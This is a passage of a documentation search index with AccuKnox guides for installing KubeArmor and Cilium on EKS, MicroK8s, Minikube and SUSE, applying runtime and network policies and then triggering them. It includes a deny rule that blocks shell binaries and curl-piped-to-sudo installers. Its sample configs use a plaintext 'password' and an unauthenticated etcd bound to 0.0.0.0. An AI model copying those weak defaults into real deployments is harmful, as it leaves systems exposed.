<p></p> <p>Violating the policy:</p> <pre><code>cat /var/log/tomcat/catalina.out\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/al2/al2/#for-log-based-alerts","title":"For Log Based Alerts","text":"<ul> <li>You can visit our Enterprise version</li> </ul>"},{"location":"open-source/kubearmor/eks_al2/eks_al2/","title":"EKS Amazon Linux 2","text":""},{"location":"open-source/kubearmor/eks_al2/eks_al2/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on EKS Amazon Linux 2 by applying policies on Kubernetes workloads.</p> <p>Note: As of now KubeArmor for EKS Amazon Linux 2 will only Support for Audit mode. In the upcoming updates it will also support Enforcements, such as Allow and Block.</p>"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-1-create-a-eks-cluster-using-aws-console","title":"Step 1: Create a EKS-Cluster using AWS Console","text":"<p>Once the nodegroup is created, Install EKS CTL, AWS CLI, Helm tools</p> <pre><code>aws configure\n</code></pre> <p></p> <pre><code>eksctl get cluster\n</code></pre> <pre><code>aws eks --region us-west-1 update-kubeconfig --name eks-amazon-kubearmor\n</code></pre> <p></p> <pre><code>kubectl get nodes\n</code></pre> <pre><code>kubectl get svc\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-2-karmor-install","title":"Step 2: Karmor Install","text":"<p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <p></p> <p><pre><code>karmor install\n</code></pre> </p> <pre><code>karmor version\n</code></pre> <p></p> <p>Karmor Verify:</p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-3-kubearmor-policy-on-process-level","title":"Step 3: Kubearmor Policy on Process Level","text":"<p>1. Create a nginx deployment</p> <pre><code>kubectl create deployment nginx --image nginx\n</code></pre> <p></p> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Explore the Policy</p> <pre><code>cat nginx-kubearmor-policy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/touch\n- path: /bin/rm\n- path: /bin/chmod\n- path: /usr/sbin/nginx\naction: Audit\n</code></pre> <p></p> <p>3. Apply the Policy</p> <pre><code>kubectl apply -f nginx-kubearmor-policy.yaml\n</code></pre> <pre><code>kubectl get kubeArmorPolicy\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels. Ex: (app: nginx)</p> <p>4. Violating the Policy</p> <pre><code>kubectl exec -it nginx-6799fc88d8-qdnfq -- bash\n</code></pre> <p></p> <p>5. Kubearmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>6. Verifying policy Violation logs</p> <pre><code>karmor log\n</code></pre> <p></p> <p></p> <p></p> <p></p>"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-4-kubearmor-policy-on-file-level","title":"Step 4: Kubearmor Policy on File Level","text":"<p>1. Explore the policy</p> <pre><code>cat nginx-kubearmor-policy.yaml\n</code></pre> <p><pre><code> apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nfile:\nseverity: 3\nmatchPaths:\n- path: /etc/fstab\naction: Audit\n</code></pre> </p> <p>2. Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-policy.yaml\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels. Ex: (app: nginx)</p> <p>3.  Violating the policy</p> <pre><code>kubectl exec -it nginx-6799fc88d8-qdnfq -- bash\n</code></pre> <p></p> <p>4. Kubearmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>5. Verify the policy violation log</p> <p><pre><code>karmor log\n</code></pre> </p>"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-5-kubearmor-policy-on-directory-level","title":"Step 5: Kubearmor Policy on Directory level","text":"<p>1. Explore the policy</p> <pre><code>cat nginx-kubearmor-policy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nfile:\nseverity: 3\nmatchDirectories:\n- dir: /boot/\nrecursive: true\naction: Audit\n</code></pre> <p></p> <p>2. Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-policy.yaml\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels. Ex: (app: tomcat)</p> <p>3. Violating the policy</p> <pre><code>kubectl exec -it nginx-6799fc88d8-qdnfq -- bash\n</code></pre> <p></p> <p>4. Kubearmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>5. Verify policy violation log</p> <pre><code>karmor log\n</code></pre> <p></p> <p></p>"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#for-log-based-alerts","title":"For Log Based Alerts","text":"<ul> <li>You can visit our Enterprise version</li> </ul>"},{"location":"open-source/microk8s/microk8s/","title":"Microk8s","text":""},{"location":"open-source/microk8s/microk8s/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on MicroK8's by applying policies on kubernetes workloads.</p>"},{"location":"open-source/microk8s/microk8s/#step-1-setup-microk8s","title":"Step 1: Setup MicroK8's","text":"<p>Clone the Kubearmor Repository:</p> <pre><code>git clone https://github.com/kubearmor/KubeArmor.git\n</code></pre> <p></p> <pre><code>cd KubeArmor/contribution/microk8s\n</code></pre> <p>Run the script to set up MicroK8's Kubernetes:</p> <pre><code>./install_microk8s.sh\n</code></pre> <pre><code>kubectl get all -A\n</code></pre> <p></p>"},{"location":"open-source/microk8s/microk8s/#step-2-setup-kubearmor","title":"Step 2: Setup KubeArmor","text":"<p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor install\n</code></pre> <p></p> <p>Karmor Verify: </p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/microk8s/microk8s/#step-3-create-kubearmor-policy","title":"Step 3: Create KubeArmor policy","text":"<p>1. Create nginx deployment</p> <pre><code>kubectl create deployment nginx --image nginx\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy </p> <ul> <li> <p>KubeArmor is an open source software that enables you to protect your cloud workload at run-time.</p> </li> <li> <p>To learn more about KubeArmor</p> </li> </ul> <pre><code>vi ksp-block-untrusted-shell-execution.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-block-untrusted-shell-execution\nnamespace: default # Change your namespace\nspec:\ntags : [\"MITRE\",\"D3fend\",\"Execution\",\"Unix Shell\"] message: \"Bash shells have been accessed\"\nselector:\nmatchLabels:\napp: nginx\nprocess:\nseverity: 2 # Higher severity for processes \nmatchPaths:\n- path: /bin/bash\n- path: /bin/sh\n- path: /usr/bin/bash\n- path: /usr/bin/env\n- path: /usr/bin/shell\n- path: /bin/ksh\n- path: /etc/init.d      - path: /dev/tty - path: /bin/zsh\n- path: /bin/tcsh\n- path: /bin/csh\naction: Block   file:\nseverity: 10  # lowest severity for processes invoked as child process of bash\nmatchPaths:\n- path: /bin/bash\n- path: /bin/sh\n- path: /usr/bin/bash\n- path: /usr/bin/env\n- path: /usr/bin/shell\n- path: /bin/ksh\n- path: /etc/init.d      - path: /dev/tty - path: /bin/zsh\n- path: /bin/tcsh\n- path: /bin/csh\nfromSource:\n- path: /bin/bash\naction: Audit\n</code></pre> <p>3. Apply the policy</p> <pre><code>kubectl apply -f ksp-block-untrusted-shell-execution.yaml  </code></pre> <p>Note: Policy will work based on  matched labels  Ex:(app: nginx)</p> <pre><code>kubectl get pods\n</code></pre> <p></p> <p>4. Violating the policy</p> <pre><code>kubectl exec -it &lt;Pod Name&gt; -- bash </code></pre> <p>5. run sh, env commands for policy violation</p> <p></p> <p>Note: Kubearmor is working, we can't run the commands, which we have blocked in the policy..</p>"},{"location":"open-source/microk8s/microk8s/#step-4-getting-alertstelemetry-from-kubearmor","title":"Step 4:  Getting Alerts/Telemetry from KubeArmor","text":"<p>1. Kubearmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>2. Verifying policy Violation logs</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/microk8s/microk8s/#step-5-cilium-install","title":"Step 5: Cilium Install","text":"<p>Install Cilium CLI:</p> <pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>cilium install\n</code></pre> <p>Above tradition installation method is not working as expected, so installing using Microk8's command.</p> <pre><code>microk8s enable cilium\n</code></pre> <p></p> <p></p> <pre><code>cilium status </code></pre> <p></p> <p>Cilium Hubble Enable: </p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify: </p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p> <p>Install the Hubble CLI Client:</p> <pre><code>export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\n</code></pre> <pre><code>curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check hubble-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <p></p>"},{"location":"open-source/microk8s/microk8s/#step-6-cilium-policy","title":"Step 6: Cilium Policy","text":"<p>1. Create a Mysql deployment and Verify it</p> <pre><code>vi mysql.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: accuknox-mysql-haproxy\nspec:\nports:\n- port: 3306\nselector:\napp: mysql\ntype: ClusterIP\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: accuknox-mysql\nspec:\nselector:\nmatchLabels:\napp: mysql\nstrategy:\ntype: Recreate\ntemplate:\nmetadata:\nlabels:\napp: mysql\nspec:\ncontainers:\n- image: mysql:8.0\nname: mysql\nresources:\nrequests:\nmemory: 100M\ncpu: 100m\n#        ephemeral-storage: 2G\nlimits:\nmemory: 1500M\ncpu: 1000m\n#        ephemeral-storage: 2G\nenv:\n# Use secret in real usage\n- name: MYSQL_ROOT_PASSWORD\nvalue: password\nports:\n- containerPort: 3306\nname: mysql\nvolumeMounts:\n- name: mysql-persistent-storage\nmountPath: /var/lib/mysql\nvolumes:\n- name: mysql-persistent-storage\npersistentVolumeClaim:\nclaimName: mysql-pv-claim\n\n---\napiVersion: v1\nkind: PersistentVolume\nmetadata:\nname: mysql-pv-volume\nlabels:\ntype: local\nspec:\nstorageClassName: standard\ncapacity:\nstorage: 2Gi\naccessModes:\n- ReadWriteOnce\nhostPath:\npath: \"/mnt/data\"\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\nname: mysql-pv-claim\nspec:\nstorageClassName: standard\naccessModes:\n- ReadWriteOnce\nresources:\nrequests:\nstorage: 2Gi\n</code></pre> <pre><code>kubectl apply -f mysql.yaml\n</code></pre> <pre><code>kubectl get pods\n</code></pre> <p></p> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy</p> <pre><code>vi cnp-mitre-t1571-mysql-ingress.yaml\n</code></pre> <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\nname: cnp-mitre-t1571-mysql-ingress\nnamespace: default        #change default namespace to match your namespace\nspec:\ndescription: \"Allow ingress communication only through standard ports of MySQL pods\"\nendpointSelector:\nmatchLabels:\napp: mysql              # Change label with your own labels\ningress:\n- toPorts:\n- ports:\n- port: \"3306\"\nprotocol: TCP\n- port: \"33060\"\nprotocol: TCP\n</code></pre> <p>3. Apply the policy</p> <pre><code>kubectl apply -f cnp-mitre-t1571-mysql-ingress.yaml   </code></pre> <p></p> <p>4. Violating the policy </p> <pre><code>kubectl get pod\n</code></pre> <p></p> <pre><code>kubectl exec -it &lt;mysql_pod&gt;bash\n</code></pre> <p></p> <p>5. Deleteing the policy</p> <pre><code>kubectl delete cnp rule1-ingress\n</code></pre>"},{"location":"open-source/minikube/minikube/","title":"Minikube","text":""},{"location":"open-source/minikube/minikube/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Minikube by applying policies on kubernetes workloads.</p>"},{"location":"open-source/minikube/minikube/#step-1-clone-the-kubearmor-repository","title":"Step 1:  Clone the KubeArmor Repository","text":"<pre><code>git clone https://github.com/kubearmor/KubeArmor.git\n</code></pre>"},{"location":"open-source/minikube/minikube/#step-2-install-virtualbox","title":"Step 2: Install VirtualBox","text":"<pre><code>cd KubeArmor/contribution/minikube\n</code></pre> <pre><code>./install_virtualbox.sh\n</code></pre> <p>Note: Once VirtualBox installed, reboot the system.</p> <pre><code>sudo reboot\n</code></pre>"},{"location":"open-source/minikube/minikube/#step-3-install-minikube","title":"Step 3: Install Minikube","text":"<pre><code>cd KubeArmor/contribution/minikube\n</code></pre> <pre><code>./install_minikube.sh\n</code></pre> <pre><code>./start_minikube.sh\n</code></pre>"},{"location":"open-source/minikube/minikube/#step-4-karmor-install","title":"Step 4: Karmor Install","text":"<p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <p></p> <pre><code>karmor install\n</code></pre> <p></p> <p>Karmor Verify:</p> <pre><code>karmor version\n</code></pre> <p></p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/minikube/minikube/#step-5-kubearmor-policy","title":"Step 5:  KubeArmor Policy","text":"<p>1. Creating sample ubuntu deployment </p> <pre><code>kubectl apply -f ubuntu.yaml\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy </p> <p>*use label of the deployment </p> <pre><code>cat ksp-block-sting-rhel-v-230335.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-block-stig-rhel-v-230335\nnamespace: default # Change your namespace\nspec:\ntags: [\"STIG\",\"RHEL\"]\nmessage: \"Alert! /home/test.txt access will be Audit\"\nselector:\nmatchLabels:\napp: ubuntu # Change your matchLabels\nfile:\nseverity: 5\nmatchPaths:\n- path: /home/test.txt\naction: Block\n</code></pre> <p>3. Apply the policy</p> <pre><code>kubectl apply -f ksp-block-sting-rhel-v-230335.yaml\n</code></pre> <p></p> <p>4. Violating the policy</p> <pre><code>kubectl exec -it ubuntu-deployment-746964c6c6-j67jv bash\n</code></pre> <p></p>"},{"location":"open-source/minikube/minikube/#step-6-getting-alertstelemetry-from-kubearmor","title":"Step 6:  Getting Alerts/Telemetry from KubeArmor","text":"<p>1. KubeArmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor 32767:32767\n</code></pre> <p></p> <p>2. Verifying policy Violation logs</p> <pre><code>Karmor log\n</code></pre> <p></p>"},{"location":"open-source/minikube/minikube/#step-7-cilium-installation","title":"Step 7: Cilium Installation","text":"<p>Install Cilium CLI:</p> <pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-\nlinux-amd64.tar.gz{,.sha256sum}\n</code></pre> <p></p> <pre><code>sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n</code></pre> <p></p> <pre><code>sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>cilium install\n</code></pre> <p></p> <pre><code>kubectl get pods -n kube-system | grep cilium\n</code></pre> <p></p> <pre><code>cilium status --wait\n</code></pre> <p></p> <p>Cilium Hubble Enable: </p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify:</p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p> <p>Install Hubble CLI Client:</p> <pre><code>export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\n</code></pre> <pre><code>curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check hubble-linux-amd64.tar.gz.sha256sum\n</code></pre> <p></p> <pre><code>sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/minikube/minikube/#step-8-getting-alertstelemetry-from-cilium","title":"Step 8: Getting Alerts/Telemetry from Cilium","text":"<p>Enable port-forwarding for Cilium Hubble relay:</p> <pre><code>cilium hubble port-forward&amp;\n</code></pre> <p></p>"},{"location":"open-source/minikube/minikube/#step-9-cilium-policy","title":"Step 9: Cilium Policy","text":"<p>1. Create a tightfighter &amp; deathstart deployment</p> <pre><code>cat tightfighter-deathstart-app.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\nreplicas: 2\nselector:\nmatchLabels:\norg: empire\nclass: deathstar\ntemplate:\nmetadata:\nlabels:\norg: empire\nclass: deathstar\napp.kubernetes.io/name: deathstar\nspec:\ncontainers:\n- name: deathstar\nimage: docker.io/cilium/starwars\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: tiefighter\nlabels:\norg: empire\nclass: tiefighter\napp.kubernetes.io/name: tiefighter\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: xwing\nlabels:\napp.kubernetes.io/name: xwing\norg: alliance\nclass: xwing\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n</code></pre> <pre><code>kubectl apply -f tightfighter-deathstart-app.yaml\n</code></pre> <p></p> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy</p> <pre><code>cat sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1-egress\"\nspec:\ndescription: \"L7 policy to restrict access to specific HTTP call\"\nendpointSelector:\nmatchLabels:\nclass: tiefighter\negress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\nrules:\nhttp:\n- method: \"POST\"\npath: \"/v1/request-landing\"\n</code></pre> <pre><code>kubectl apply -f sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>kubectl get CiliumNetworkPolicy\n</code></pre> <p></p> <p>3. Violating the policy</p> <pre><code>kubectl get svc\n</code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.106.29.11/v1/request-landing\n</code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.106.29.11/v1/test\n</code></pre> <p></p> <p>4. Verifying the Cilium Violation logs</p> <pre><code>hubble observe --pod tiefighter --protocol http </code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/","title":"Suse les 15","text":""},{"location":"open-source/suse_les_15/suse_les_15/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on kubernetes workloads.</p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<p>Create etcd user:</p> <pre><code>groupadd --system etcd\n</code></pre> <p><pre><code>useradd --home-dir \"/var/lib/etcd\" \\\n--system \\\n--shell /bin/false \\\n-g etcd \\\netcd\n</code></pre> Create the necessary directories:</p> <pre><code>mkdir -p /etc/etcd\n</code></pre> <pre><code>chown etcd:etcd /etc/etcd\n</code></pre> <pre><code>mkdir -p /var/lib/etcd\n</code></pre> <pre><code>chown etcd:etcd /var/lib/etcd\n</code></pre> <p>Determine your system architecture:</p> <pre><code>uname -m\n</code></pre> <p></p> <p>Download and Install the etcd tarball for x86_64/amd64:</p> <pre><code>ETCD_VER=v3.2.7\n</code></pre> <pre><code>rm -rf /tmp/etcd &amp;&amp; mkdir -p /tmp/etcd\n</code></pre> <pre><code>curl -L \\     https://github.com/coreos/etcd/releases/download/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz \\\n-o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\n</code></pre> <pre><code>tar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz \\\n-C /tmp/etcd --strip-components=1\n</code></pre> <pre><code>cp /tmp/etcd/etcd /usr/bin/etcd\n</code></pre> <pre><code>cp /tmp/etcd/etcdctl /usr/bin/etcdctl\n</code></pre> <p>Or Download and Install the etcd tarball for arm64:</p> <pre><code>ETCD_VER=v3.2.7\n</code></pre> <pre><code>rm -rf /tmp/etcd &amp;&amp; mkdir -p /tmp/etcd\n</code></pre> <pre><code>curl -L \\  https://github.com/coreos/etcd/releases/download/${ETCD_VER}/etcd-${ETCD_VER}-linux-arm64.tar.gz \\\n-o /tmp/etcd-${ETCD_VER}-linux-arm64.tar.gz\n</code></pre> <pre><code>tar xzvf /tmp/etcd-${ETCD_VER}-linux-arm64.tar.gz \\\n-C /tmp/etcd --strip-components=1\n</code></pre> <pre><code>cp /tmp/etcd/etcd /usr/bin/etcd\n</code></pre> <pre><code>cp /tmp/etcd/etcdctl /usr/bin/etcdctl\n</code></pre> <p>Create and Edit the .yaml file:</p> <pre><code>sudo vi /etc/etcd/etcd.conf.yaml\n</code></pre> <pre><code>name: controller\ndata-dir: /var/lib/etcd\ninitial-cluster-state: 'new'\ninitial-cluster-token: 'etcd-cluster-01'\ninitial-cluster: controller=http://0.0.0.0:2380\ninitial-advertise-peer-urls: http://0.0.0.0:2380\nadvertise-client-urls: http://0.0.0.0:2379\nlisten-peer-urls: http://0.0.0.0:2380\nlisten-client-urls: http://0.0.0.0:2379\n</code></pre> <p>Create and Edit the .service file:</p> <pre><code>sudo vi /usr/lib/systemd/system/etcd.service\n</code></pre> <pre><code>[Unit]\nAfter=network.target\nDescription=etcd - highly-available key value store\n\n[Service]\n# Uncomment this on ARM64.\n# Environment=\"ETCD_UNSUPPORTED_ARCH=arm64\"\nLimitNOFILE=65536\nRestart=on-failure\nType=notify\nExecStart=/usr/bin/etcd --config-file /etc/etcd/etcd.conf.yml\nUser=etcd\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Reload systemd service files with:</p> <pre><code>systemctl daemon-reload\n</code></pre> <p>Enable and Start the etcd service:</p> <pre><code>systemctl enable etcd\n</code></pre> <pre><code>systemctl start etcd\n</code></pre> <pre><code>systemctl status etcd\n</code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-2-install-kvm-service-in-control-plane-vm","title":"Step 2: Install KVM-Service in control plane VM","text":"<p>Download the Latest RPM Package</p> <pre><code>wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.rpm\n</code></pre> <p></p> <pre><code>zypper install kvmservice_0.1_linux-amd64.rpm\n</code></pre> <p></p> <pre><code>systemctl status kvmservice </code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-3-install-karmor-in-control-plane-vm","title":"Step 3: Install Karmor in control plane VM","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/suse_les_15/suse_les_15/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command to Add the VM:</p> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <p></p> <p>To see the onboarded VM\u2019s</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-5-generate-installation-scripts-for-configured-worker-vms","title":"Step 5: Generate Installation scripts for configured worker VMs","text":"<p>Generate VM installation scripts for the configured VM by running the following command:</p> <pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-6-execute-the-installation-script-in-vms","title":"Step 6: Execute the Installation script in VMs","text":"<p>Note: Docker needs to Install before running the script.</p> <p>Install pre-requisites:</p> <pre><code>sudo zypper ref\nsudo zypper in bcc-tools bcc-examples\n</code></pre> <p></p> <pre><code>fullkver=$(zypper se -s kernel-default-devel | awk '{split($0,a,\"|\"); print a[4]}' | grep $(uname -r | awk '{gsub(\"-default\", \"\");print}') | sed -e 's/^[ \\t]*//' | tail -n 1)\n</code></pre> <p></p> <pre><code>zypper -n --config /var/opt/carbonblack/response/zypp.conf install -f -y kernel-default-devel=\"$fullkver\"\n</code></pre> <p></p> <pre><code>zypper in apparmor-utils\n</code></pre> <p></p> <pre><code>zypper in apparmor-profiles\n</code></pre> <p></p> <pre><code>systemctl restart apparmor.service\n</code></pre> <pre><code>vi testvm1.sh\n</code></pre> <p>Comment the following line on script and save it:</p> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Note: Upcoming release will fix the above comment section.</p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM  by running the following command:</p> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the KVM-Service is running on control plane VM &amp; To onboard more worker VM repeat Step 4, Step 5 &amp; Step 6.</p> <p>You can verify by running following command:</p> <pre><code>sudo docker ps\n</code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-7-install-kubearmor-on-worker-vms","title":"Step 7: Install Kubearmor on worker VMs","text":"<p>Download the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm\n</code></pre> <p></p> <pre><code>zypper install kubearmor_0.3.1_linux-amd64.rpm\n</code></pre> <p></p> <p>Start &amp; Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-8-apply-and-verify-kubearmor-system-policy","title":"Step 8: Apply and Verify Kubearmor system policy","text":"<pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: khp-02\nspec:\nseverity: 5\nfile:\nmatchPaths:\n- path: /proc/cpuinfo\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm  policy add khp-example-vmname.yaml\n</code></pre>"},{"location":"open-source/suse_les_15/suse_les_15/#step-9-policy-violation","title":"Step 9: Policy Violation","text":"<p>With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below.</p> <pre><code>cat /proc/cpuinfo\n</code></pre> <p></p> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-10-apply-and-verify-cilium-network-policy","title":"Step 10: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>cat vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: 